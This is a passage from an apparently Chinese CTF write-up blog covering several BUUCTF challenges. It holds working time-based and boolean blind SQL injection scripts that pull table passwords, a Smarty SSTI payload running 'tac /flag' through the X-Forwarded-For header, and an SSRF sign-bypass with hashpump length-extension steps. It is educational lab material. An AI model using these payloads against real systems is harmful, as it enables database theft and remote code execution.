@Author:boogipop</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://bf52117c-2f6a-4b88-88d0-987561e4d67a.node4.buuoj.cn:81/search.php&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>:<span class="string">f&quot;elt(ascii(substr((select(group_concat(password))from`F1naI1y`),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(0.1))&quot;</span>&#125;</span><br><span class="line">        t1=time.time()</span><br><span class="line">        r = requests.get(url,params=data)</span><br><span class="line">        t2=time.time()</span><br><span class="line">        <span class="built_in">print</span>(t2-t1)</span><br><span class="line">        <span class="keyword">if</span> t2-t1&gt;<span class="number">0.5</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="comment">#elt(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where`table_schema`=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.1))</span></span><br><span class="line">    <span class="comment">#F1naI1y,Flaaaaag</span></span><br><span class="line">    <span class="comment">#            &quot;id&quot;:f&quot;elt(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where`table_name`=&#x27;F1naI1y&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.1))&quot;&#125;</span></span><br><span class="line">    <span class="comment">#id,username,password</span></span><br><span class="line">    <span class="comment">#&quot;id&quot;:f&quot;elt(ascii(substr((select(group_concat(id,username,password))from`F1naI1y`),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.1))&quot;&#125;</span></span><br><span class="line">    <span class="comment">#1mygodcl4y_is_really_amazing,2welcomewelcome_to_my_blog,3sitehttp://www.cl4y.top,4sitehttp://www.cl4y.top,5sitehttp://www.cl4y.top,6sitehttp://www.cl4</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这是我的时间盲注脚本，还有一个是用布尔盲注，我就把大佬的拿过来拉：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: jiaoben</span></span><br><span class="line"><span class="comment"># @Date  :  2020/05/03</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://dcf33d60-7ffa-41c0-8915-e935ccbdd37b.node3.buuoj.cn//search.php&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload</span>(<span class="params">i, j</span>):</span><br><span class="line">    <span class="comment"># 数据库名字</span></span><br><span class="line">    sql = <span class="string">&quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;</span>%(i,j)</span><br><span class="line">    <span class="comment"># 表名</span></span><br><span class="line">    <span class="comment"># sql = &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),%d,1))&gt;%d)^1&quot;%(i,j)</span></span><br><span class="line">    <span class="comment"># 列名</span></span><br><span class="line">    <span class="comment"># sql = &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot;%(i,j)</span></span><br><span class="line">    <span class="comment"># 查询flag</span></span><br><span class="line">    <span class="comment"># sql = &quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot; % (i, j)</span></span><br><span class="line">    data = &#123;<span class="string">&quot;id&quot;</span>: sql&#125;</span><br><span class="line">    r = requests.get(url, params=data)</span><br><span class="line">    <span class="comment"># print (r.url)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Click&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">       res = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">       res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10000</span>):</span><br><span class="line">        <span class="built_in">print</span>(i, <span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        low = <span class="number">31</span></span><br><span class="line">        high = <span class="number">127</span></span><br><span class="line">        <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">              mid = (low + high) // <span class="number">2</span></span><br><span class="line">              res = payload(i, mid)</span><br><span class="line">              <span class="keyword">if</span> res:</span><br><span class="line">                 low = mid + <span class="number">1</span></span><br><span class="line">              <span class="keyword">else</span>:</span><br><span class="line">                 high = mid - <span class="number">1</span></span><br><span class="line">        f = <span class="built_in">int</span>((low + high + <span class="number">1</span>)) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (f == <span class="number">127</span> <span class="keyword">or</span> f == <span class="number">31</span>):</span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># print (f)</span></span><br><span class="line">        flag += <span class="built_in">chr</span>(f)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">exp()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag=&#x27;</span>, flag)</span><br></pre></td></tr></table></figure>
<p>这边用的是按位异或来判断布尔</p>
<h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p>SSTI注入<br>这一题很露骨了就：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666329180019-f854ef7e-ab7b-4bd7-8e9e-76fea142661d.png#averageHue=%23fcfbfb&clientId=u0dd2d63b-66d0-4&from=paste&height=560&id=u7ea8703d&name=image.png&originHeight=700&originWidth=1784&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74693&status=done&style=none&taskId=ua4f899de-63b1-463a-9675-b3ca0d2debf&title=&width=1427.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666329183089-ac59ee69-16af-44e3-8373-f4451826a238.png#averageHue=%23fbf9f9&clientId=u0dd2d63b-66d0-4&from=paste&height=45&id=ub4b2f8dc&name=image.png&originHeight=56&originWidth=354&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2983&status=done&style=none&taskId=u4587da61-14ba-41ec-862b-ba3c1cbbda5&title=&width=283.2" alt="image.png"><br>最重要的是下面有个build with smarty 说明就是smarty模板了，那就得考虑ssti注入了，注入点那肯定就是XFF头咯：<br><code>&#123;$smarty.version&#125;</code>：来查看smarty的版本：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666329333982-6514677a-f1ce-4da3-af03-ac926fb33fd5.png#averageHue=%23fdfdfc&clientId=u0dd2d63b-66d0-4&from=paste&height=52&id=ub9dde338&name=image.png&originHeight=65&originWidth=416&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2649&status=done&style=none&taskId=uc205f5d9-ad59-44d3-98e2-ec6d3b0dc35&title=&width=332.8" alt="image.png"><br>确认是3.1版本，用以下if语句去执行php代码：<br><code>&#123;if system(&#39;tac /flag&#39;)&#125;&#123;/if&#125;</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666329365958-521cd8ab-a276-45f4-a3bc-de16796c3b95.png#averageHue=%23fefefe&clientId=u0dd2d63b-66d0-4&from=paste&height=46&id=u2d344255&name=image.png&originHeight=58&originWidth=905&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2219&status=done&style=none&taskId=ud238710d-c506-4148-bf90-862aec91ada&title=&width=724" alt="image.png"><br>简单的SSTI</p>
<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>考点很清晰就是标题写的SSRF了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):</span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>浅浅的代码审计一下咯~一百来行代码也没啥，因为里面大部分的东西没啥<br>通过这一题感觉还是稍微的磨砺了我的一点代码审计能力的，居然也看懂了？<br>首先是定义了一个Task大类，里面大致分为<code>初始化，写入内容，读取内容，检验</code>四个模块，init就是初始化模块，然后<code>Exec</code>自定义函数中分为写和读两个模块，当action为<code>scan</code>时，会把我们<code>param</code>指定的文件写入一个沙盒内，然后当action为<code>read</code>时，把写入的内容读出来，在这2个过程中要进行<code>checksign</code>函数的检查<br>checksign函数：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666334350487-c793f56e-e29c-4a53-b618-27d34e0822f0.png#averageHue=%232d2c2b&clientId=u0dd2d63b-66d0-4&from=paste&height=129&id=uc5ed4827&name=image.png&originHeight=161&originWidth=740&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14788&status=done&style=none&taskId=u39c85684-6f37-41e5-b265-eb48e438c7a&title=&width=592" alt="image.png"><br>将getsign函数的结果和sign参数的值比较，getsign：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666334373257-e3c48c59-4db5-4f88-8a97-922a9176b372.png#averageHue=%232f2e2d&clientId=u0dd2d63b-66d0-4&from=paste&height=66&id=u8afc4252&name=image.png&originHeight=83&originWidth=851&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12832&status=done&style=none&taskId=u62a1355a-af7f-455a-b6de-3cc1888ce8a&title=&width=680.8" alt="image.png"><br>设置了一个secret_key，这个我们是不知道的，然后<code>param,action</code>我们是可控的<br>还有个产生sign的函数：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666334415788-6299e8e2-9bcb-40d7-a4cb-a30e4b2a7018.png#averageHue=%232e2d2b&clientId=u0dd2d63b-66d0-4&from=paste&height=98&id=u9c21e50e&name=image.png&originHeight=123&originWidth=739&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21436&status=done&style=none&taskId=uf43b882a-f18a-4d13-9d3a-43d7367ecfa&title=&width=591.2" alt="image.png"><br>我们可以通过这个参数得到sign值，但是action被写死了<br>所以我们大致的思路很清晰了，就是通过把flag文件写入沙盒，再读取出来</p>
<p>flag文件再<code>./flag.txt</code>这个题目提示有，我们现在就来构造一下，首先进入genesign路由产生sign：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666334631639-95466c87-3a07-46e9-ae12-c3fdc493e804.png#averageHue=%23b5bcb5&clientId=u0dd2d63b-66d0-4&from=paste&height=74&id=u0dfb5eff&name=image.png&originHeight=92&originWidth=1115&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13651&status=done&style=none&taskId=uf3953a94-32b0-4256-b38c-1ac71e27ca3&title=&width=892" alt="image.png"><br>urlopen函数可以去网上了解一下，可以读取文件，直接输入文件名即可：<br>这样就获得了sign值，然后在challenge路由中进入题目入口，传参：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666334626529-7c87535c-eb68-4e02-a181-f8267e74ade7.png#averageHue=%23b0ccf1&clientId=u0dd2d63b-66d0-4&from=paste&height=58&id=u10ae2ea7&name=image.png&originHeight=73&originWidth=642&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5071&status=done&style=none&taskId=u6918dcb6-2fc1-46e3-850c-b5e0ce24523&title=&width=513.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666334597780-bd7b181d-28bd-4601-9453-0d4d15a22b09.png#averageHue=%23252525&clientId=u0dd2d63b-66d0-4&from=paste&height=51&id=ud47d2ce8&name=image.png&originHeight=64&originWidth=995&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9877&status=done&style=none&taskId=u189218f9-5171-43d3-9437-3e6200101ea&title=&width=796" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666334639846-b2aa7013-774e-4dbc-a117-5947a61bee2a.png#averageHue=%23cacaca&clientId=u0dd2d63b-66d0-4&from=paste&height=558&id=u2b349b66&name=image.png&originHeight=698&originWidth=1364&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30051&status=done&style=none&taskId=u86be6b36-9bca-43ab-87a7-831fc7eacea&title=&width=1091.2" alt="image.png"><br>只返回code200说明成功将flag文件写入沙盒<br>最后就是想怎么去读取了，由于action被写死是scan了，但是注意<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666334685913-7fb22906-be54-48e3-96a8-97d60f080b13.png#averageHue=%232d2c2b&clientId=u0dd2d63b-66d0-4&from=paste&height=31&id=u7e1641ff&name=image.png&originHeight=39&originWidth=344&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4656&status=done&style=none&taskId=u2c8539e1-6b1a-4dba-82b0-9a5cce89173&title=&width=275.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666334674361-f2c88dac-684a-4a28-9cfd-8ab15f5d1027.png#averageHue=%232e2d2b&clientId=u0dd2d63b-66d0-4&from=paste&height=50&id=u3de2f320&name=image.png&originHeight=62&originWidth=758&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11868&status=done&style=none&taskId=u119e0b1c-4948-42c1-b99c-135a18e46a6&title=&width=606.4" alt="image.png"><br>这里只说read在action中即可，没说要完全等于read，而且sign是通过字符串拼接产生的，我们可以如下绕过：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666334732298-8d8a5d89-5ee9-4cd5-bc9a-d465e93561ab.png#averageHue=%23b5c1b9&clientId=u0dd2d63b-66d0-4&from=paste&height=62&id=ucbafa0eb&name=image.png&originHeight=78&originWidth=1092&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12685&status=done&style=none&taskId=u5bd531d6-cf97-4970-8f4f-a3db8cede61&title=&width=873.6" alt="image.png"><br>传入<code>flag.txtread</code>，可以获得<code>flag.txtreadscan</code>的sign值，然后在challenge界面输入：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666334766442-2b2257af-0761-448e-8bbd-1f1ca876f4e0.png#averageHue=%23ecedee&clientId=u0dd2d63b-66d0-4&from=paste&height=63&id=ud64d1a66&name=image.png&originHeight=79&originWidth=604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4778&status=done&style=none&taskId=uedc260f6-be5b-4190-a143-0e423396c2c&title=&width=483.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666334774854-1ebd7e03-2fc7-4076-afd9-380864dbcb97.png#averageHue=%23cccbcb&clientId=u0dd2d63b-66d0-4&from=paste&height=542&id=u289ed981&name=image.png&originHeight=678&originWidth=1333&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33386&status=done&style=none&taskId=uc0110373-2b52-45c3-a2ec-10840aad0be&title=&width=1066.4" alt="image.png"><br>action中有read，所以就不慌了，这样就可以读出flag拉</p>
<p>还有一种比较冷门的解法就是利用<code>hashpump</code>进行hash拓展攻击：<br>kali先安装：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/bwall/HashPump</span><br><span class="line">apt-get install g++ libssl-dev</span><br><span class="line">cd HashPump</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<p>之后直接运行脚本得到<code>md5(&#39;secret_key+flag.txt&#39;+scan+read)</code>的值，进行拓展长度估计需要的几个前提条件<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666336188780-4533c7b2-6811-4a43-af32-4ec3d29ff584.png#averageHue=%23fbfafa&clientId=u0dd2d63b-66d0-4&from=paste&height=293&id=ue50900c9&name=image.png&originHeight=366&originWidth=872&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45142&status=done&style=none&taskId=u4a90d5a3-e981-4c3b-ba53-a4c5f0c8ada&title=&width=697.6" alt="image.png"><br>我们知道<code>len(secret_key+flag.txt)=24</code>，也知道<code>md5(secret_key+flag.txt+scan)</code>的值，所以可以进行拓展估计：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666336241999-847554e0-ea9d-41a1-9a0f-ca2d9f78e4c8.png#averageHue=%23f2e3b5&clientId=u0dd2d63b-66d0-4&from=paste&height=104&id=ue359dfaa&name=image.png&originHeight=130&originWidth=1206&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13810&status=done&style=none&taskId=u3a713a87-e295-4e3a-9b39-2b45fa1a074&title=&width=964.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666336289037-6ef508ef-a873-4f14-a4c4-fefc8922d6d3.png#averageHue=%232d3036&clientId=u0dd2d63b-66d0-4&from=paste&height=167&id=u281fbb55&name=image.png&originHeight=209&originWidth=683&originalType=binary&ratio=1&rotation=0&showTitle=false&size=47924&status=done&style=none&taskId=uc2cef749-c9ce-4ae1-a326-b90d52b3363&title=&width=546.4" alt="image.png"><br>我们把<code>(secret_key+flag.txt)</code>看成salt，<code>scan</code>看成message，<code>action</code>看成padding即可<br>最后：<br><img 